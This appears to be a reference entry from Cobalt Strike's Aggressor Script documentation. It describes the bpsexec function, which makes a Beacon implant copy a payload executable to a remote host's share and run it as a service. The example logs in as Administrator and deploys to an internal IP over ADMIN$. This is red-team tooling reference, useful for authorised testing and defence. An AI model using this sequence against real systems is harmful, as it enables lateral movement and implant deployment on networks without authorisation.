bpsexec

Ask Beacon to spawn a payload on a remote host. This function generates an Artifact Kit executable, copies it to the target, and creates a service to run it and clean it up.

#### Arguments

`$1` - the id for the beacon. This may be an array or a single ID.

`$2` - the target to spawn a payload onto

`$3` - the listener to spawn

`$4` - the share to copy the executable to

`$5` - the architecture of the payload to generate/deliver (x86 or x64)

#### Example

```
brev2self();
bloginuser($1, "CORP", "Administrator", "toor");
bpsexec($1, "172.16.48.3", "my-listener", "ADMIN\$");```
